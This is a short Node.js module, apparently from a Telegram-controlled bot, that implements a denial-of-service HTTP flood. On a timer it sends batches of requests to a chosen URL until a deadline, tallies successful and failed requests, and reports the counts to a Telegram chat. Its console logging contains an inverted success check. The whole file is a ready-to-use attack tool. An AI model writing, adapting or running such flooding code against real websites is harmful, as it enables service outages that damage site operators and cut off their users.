// Подключаем модуль для запросов
const req = require('request');

const dos = (url, requests, time, deadline, bot, chat_id) => {
    let err = ok = 0;
    let passed_requests = 0;
    let dosing_interval = setInterval(() => {
        // Цикл запросов
        for (let i = requests; i--;)
            req(url, error => {
                
                if (!error) {
                    ok++;
                    passed_requests++;
                } else {
                    err++;
                }
            });
        // выводим в консоль если запрос прошёл или привёл к ошибкам на сервере
        console.log(`Запрос прошёл:' ${ ok === 0 ? 'да' : 'нет' }\nОшибок при запросе: ${ err }`);
        // обнуляем количество прошедших запросов и количество ошибок за пройденный интервал времени
        err = ok = 0;

        // Устанавливаем интервал (мс)
    }, time);
    let deadline_interval = setInterval(() => {
        if (new Date().getTime() >= deadline) {
            clearInterval(dosing_interval);
            bot.sendMessage(chat_id, `✅ Запитів пройшло: ${passed_requests} / ${requests*60}\n⛔️ Помилок: ${requests*60 - passed_requests}`);
            if ((requests*60 - passed_requests) == requests*60) {
                bot.sendMessage(chat_id, "<b>Жодного запиту не пройшло 🤔</b>\n\nМабуть цей ресурс не працює, або помилки у посиланні на цей ресурс.", {parse_mode: 'HTML'});
            }
            clearInterval(deadline_interval);
        }
    }, 1000);
    return;
};

module.exports = dos;